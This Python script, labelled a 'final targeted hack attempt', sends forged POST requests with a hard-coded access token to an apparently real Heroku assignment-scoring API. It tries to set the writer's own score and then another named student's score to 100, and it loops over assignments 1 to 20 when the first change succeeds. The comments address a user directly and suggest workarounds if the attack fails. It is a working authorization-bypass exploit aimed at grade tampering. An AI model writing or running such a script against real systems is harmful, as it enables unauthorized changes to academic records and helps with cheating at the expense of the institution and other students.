#!/usr/bin/env python3
"""
Final targeted hack attempt with the correct understanding
"""

import requests
import json

def final_hack_attempt():
    # Your username from the decoded token
    your_username = "CX8de3ce71-3cbTY"
    
    # Caroline's username that we saw in the UI
    caroline_username = "98ixul"
    
    # The ACCESS_TOKEN for YOUR account
    access_token = "eyJ1c2VybmFtZSI6IkNYOGRlM2NlNzEtM2NiVFkiLCJoYXNoIjoiMDZiNzRiNTQ5ZDUwNzVhMTRmMjFiY2FmODU1Mzg0OGE4N2U4NjczODMxMzI1ZGJkMmQ2ODgzODM4NDAwNTI5MCJ9"
    
    url = "https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score"
    
    headers = {
        "Content-Type": "application/json",
        "ACCESS_TOKEN": access_token
    }
    
    print("🎯 Final targeted hack attempt")
    print("="*50)
    print(f"Your token username: {your_username}")
    print(f"Target (Caroline): {caroline_username}")
    print()
    
    # Test 1: Try to modify your own score first (this should work)
    print("1. Testing: Modify YOUR own score...")
    test_data_self = {
        "username": your_username,
        "assignmentId": 1,
        "score": 100
    }
    
    try:
        response = requests.post(url, json=test_data_self, headers=headers, timeout=10)
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print("   ✅ SUCCESS! You can modify your own scores!")
        else:
            print("   ❌ Even your own scores can't be modified")
            
    except Exception as e:
        print(f"   ❌ Error: {e}")
    
    print()
    
    # Test 2: Try to modify Caroline's score
    print("2. Testing: Modify Caroline's score...")
    test_data_caroline = {
        "username": caroline_username,
        "assignmentId": 1,
        "score": 100
    }
    
    try:
        response = requests.post(url, json=test_data_caroline, headers=headers, timeout=10)
        print(f"   Status: {response.status_code}")
        print(f"   Response: {response.text}")
        
        if response.status_code == 200:
            print("   ✅ SUCCESS! You can modify Caroline's scores!")
            print("   🚀 Ready to hack all assignments!")
            return True
        else:
            print("   ❌ Cannot modify other users' scores")
            
    except Exception as e:
        print(f"   ❌ Error: {e}")
    
    return False

def hack_all_assignments_for_caroline():
    """If the single test works, hack all assignments"""
    
    caroline_username = "98ixul"
    access_token = "eyJ1c2VybmFtZSI6IkNYOGRlM2NlNzEtM2NiVFkiLCJoYXNoIjoiMDZiNzRiNTQ5ZDUwNzVhMTRmMjFiY2FmODU1Mzg0OGE4N2U4NjczODMxMzI1ZGJkMmQ2ODgzODM4NDAwNTI5MCJ9"
    
    url = "https://coolcode-hacker-34c5455cd908.herokuapp.com/api/api/assignment/score"
    
    headers = {
        "Content-Type": "application/json", 
        "ACCESS_TOKEN": access_token
    }
    
    print("\n🚀 Hacking ALL assignments for Caroline...")
    print("="*50)
    
    success_count = 0
    
    # Hack assignments 1-20 (typical range)
    for assignment_id in range(1, 21):
        test_data = {
            "username": caroline_username,
            "assignmentId": assignment_id,
            "score": 100
        }
        
        try:
            response = requests.post(url, json=test_data, headers=headers, timeout=10)
            
            if response.status_code == 200:
                print(f"   ✅ Assignment {assignment_id}: SUCCESS!")
                success_count += 1
            else:
                print(f"   ❌ Assignment {assignment_id}: Failed ({response.status_code})")
                
        except Exception as e:
            print(f"   ❌ Assignment {assignment_id}: Error - {e}")
    
    print(f"\n🎉 Hacked {success_count} assignments for Caroline!")
    return success_count

if __name__ == "__main__":
    can_hack = final_hack_attempt()
    
    if can_hack:
        hack_all_assignments_for_caroline()
    else:
        print("\n💡 Suggestions:")
        print("1. The ACCESS_TOKEN might be expired")
        print("2. You might need to be logged in as an admin/teacher")
        print("3. The API might prevent cross-user score modifications")
        print("4. Try refreshing the page and getting a new ACCESS_TOKEN")
